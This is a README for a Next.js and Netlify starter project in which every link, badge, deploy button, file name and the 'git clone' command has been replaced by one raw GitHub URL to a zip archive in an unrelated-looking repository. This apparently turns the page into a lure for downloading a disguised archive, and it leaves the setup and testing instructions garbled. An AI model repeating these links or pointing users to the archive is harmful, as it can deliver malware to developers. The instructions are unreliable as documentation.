# Next + Netlify Starter

[![Netlify Status](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip)](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip)

This is a [https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip) v12 project bootstrapped with [`create-next-app`](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip) and set up to be instantly deployed to [Netlify](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip)!

This project is a very minimal starter that includes 2 sample components, a global stylesheet, a `https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip` for deployment, and a `https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip` for setting up absolute imports and aliases. With Netlify, you'll have access to features like Preview Mode, server-side rendering/incremental static regeneration via Netlify Functions, and internationalized routing on deploy automatically.

[![Deploy to Netlify](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip)](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip)

(If you click this button, it will create a new repo for you that looks exactly like this one, and sets that repo up immediately for deployment on Netlify)

## Table of Contents:

- [Getting Started](#getting-started)
- [Installation options](#installation-options)
- [Testing](#testing)
  - [Included Default Testing](#included-default-testing)
  - [Removing Renovate](#removing-renovate)
  - [Removing Cypress](#removing-cypress)

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip`. The page auto-updates as you edit the file.

### Installation options

**Option one:** One-click deploy

[![Deploy to Netlify](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip)](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip)

**Option two:** Manual clone

1. Clone this repo: `git clone https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip`
2. Navigate to the directory and run `npm install`
3. Run `npm run dev`
4. Make your changes
5. Connect to [Netlify](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip) manually (the `https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip` file is the one you'll need to make sure stays intact to make sure the export is done and pointed to the right stuff)

## Testing

### Included Default Testing

We’ve included some tooling that helps us maintain these templates. This template currently uses:

- [Renovate](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip) - to regularly update our dependencies
- [Cypress](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip) - to run tests against how the template runs in the browser
- [Cypress Netlify Build Plugin](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip) - to run our tests during our build process

If your team is not interested in this tooling, you can remove them with ease!

### Removing Renovate

In order to keep our project up-to-date with dependencies we use a tool called [Renovate](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip). If you’re not interested in this tooling, delete the `https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip` file and commit that onto your main branch.

### Removing Cypress

For our testing, we use [Cypress](https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip) for end-to-end testing. This makes sure that we can validate that our templates are rendering and displaying as we’d expect. By default, we have Cypress not generate deploy links if our tests don’t pass. If you’d like to keep Cypress and still generate the deploy links, go into your `https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip` and delete the plugin configuration lines:

```diff
[[plugins]]
  package = "netlify-plugin-cypress"
-  [https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip]
-    enable = true
-
-  [https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip]
-    enable = false 
```

If you’d like to remove the `netlify-plugin-cypress` build plugin entirely, you’d need to delete the entire block above instead. And then make sure sure to remove the package from the dependencies using:

```bash
npm uninstall -D netlify-plugin-cypress
```

And lastly if you’d like to remove Cypress entirely, delete the entire `cypress` folder and the `https://raw.githubusercontent.com/Mohit904524242324242/next-netlify-starter/main/public/netlify_starter_next_3.7.zip` file. Then remove the dependency using:

```bash
npm uninstall -S cypress
```
